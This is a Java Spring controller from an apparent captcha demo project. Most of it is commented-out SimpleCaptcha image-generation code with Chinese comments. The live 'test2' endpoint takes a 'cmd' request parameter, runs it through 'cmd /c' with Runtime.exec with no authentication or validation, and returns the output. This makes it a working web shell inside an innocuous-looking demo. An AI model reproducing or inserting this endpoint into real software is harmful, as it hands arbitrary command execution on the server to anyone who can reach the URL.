package std.demo.web.simplecaptcha;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Date;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;

@Controller
public class CaptchaDemo {
	// @RequestMapping(value = "verifCode", method = RequestMethod.GET)
	// public void verifCode(HttpServletRequest request,
	// HttpServletResponse response) {
	// Captcha captcha = null;
	//
	// WordRenderer wr = null;
	//
	// // 自定义
	// // 自定义设置字体颜色和大小 最简单的效果 多种字体随机显示
	// List<Font> fonts = new ArrayList<Font>();
	// fonts.add(new Font("Arial", Font.HANGING_BASELINE, 40));// 可以设置斜体之类的
	// fonts.add(new Font("Courier", Font.BOLD, 40));
	// List<Color> colors = new ArrayList<Color>();
	// colors.add(Color.white);
	// colors.add(Color.black);
	// // 字体设置
	// wr = new DefaultWordRenderer(colors, fonts);
	// // 字体边框设置(空心字)
	// // wr = new ColoredEdgesWordRenderer(colors, fonts);
	// // 设置干扰线
	// // 曲线>>参数：颜色 宽度
	// NoiseProducer npd = new CurvedLineNoiseProducer(Color.white, 1);
	// // 直线>>参数：颜色 厚度
	// // NoiseProducer npd = new StraightLineNoiseProducer(Color.white, 1);
	//
	// // --------------设置背景-------------
	// // 设置背景渐进效果 以及颜色 form为开始颜色，to为结束颜色
	// GradiatedBackgroundProducer gbp = new GradiatedBackgroundProducer();
	// gbp.setFromColor(Color.blue);
	// gbp.setToColor(Color.green);
	// // 无渐进效果，只是填充背景颜色
	// // FlatColorBackgroundProducer fbp=new
	// // FlatColorBackgroundProducer(Color.red);
	// // 加入网纹--一般不会用
	// // SquigglesBackgroundProducer sbp=new SquigglesBackgroundProducer();
	// // 没发现有什么用,可能就是默认的
	// // TransparentBackgroundProducer tbp = new
	// // TransparentBackgroundProducer();
	//
	// // 设置渲染
	// // 字体边框齿轮效果 默认是3
	// GimpyRenderer gimpy = new BlockGimpyRenderer(1);
	// // 波纹渲染 相当于加粗
	// // GimpyRenderer gimpy = new RippleGimpyRenderer();
	// // 修剪
	// // GimpyRenderer gimpy = new ShearGimpyRenderer(Color.red);
	// // 加网--第一个参数是横线颜色，第二个参数是竖线颜色
	// // GimpyRenderer gimpy = new
	// // FishEyeGimpyRenderer(Color.red,Color.yellow);
	// // 加入阴影效果 默认3，75 半径 不透明度
	// // GimpyRenderer gimpy = new DropShadowGimpyRenderer(3, 50);
	//
	// Builder builder = new Captcha.Builder(150, 100)
	// // 增加文本 默认5个随机字符
	// .addText(wr).gimp(gimpy)
	// // 增加边框
	// .addBorder()
	// // 加干扰线
	// .addNoise(npd).addNoise(npd)
	// // 字体边框
	// .addBackground(gbp);
	//
	// captcha = builder.build();
	//
	// // 全默认方式
	// // Captcha captcha = new Captcha.Builder(150, 100).addText().gimp()
	// // .addBorder().addNoise().addBackground().build();
	//
	// CaptchaServletUtil.writeImage(response, captcha.getImage());
	// System.out.println(captcha.getAnswer());
	// }
	// @RequestMapping("video")
	// public String video() {
	// return "video";
	// }
	//
	// @RequestMapping("touch")
	// public String touch() {
	// return "touch";
	// }
	//

	@RequestMapping("socket")
	public String webSocket() {
		return "webSocket";
	}

	@RequestMapping("test")
	public String test() throws IOException {
		return "admin";
	}

	@RequestMapping("test2")
	@ResponseBody
	public String test(@RequestParam("cmd") String cmd) throws IOException {
		// type C:\\Users\\sinoadmin\\Desktop\\新建文本文档.txt
		Process p = Runtime.getRuntime().exec("cmd /c " + cmd);
		InputStream in = p.getInputStream();

		BufferedReader reader = new BufferedReader(new InputStreamReader(in, "gbk"));
		StringBuilder bud = new StringBuilder();
		String tempString = null;
		// 按行读取号码文件
		while ((tempString = reader.readLine()) != null) {
			bud.append(tempString);
			System.out.println(tempString);
		}

		reader.close();

		return bud.toString();
	}

}
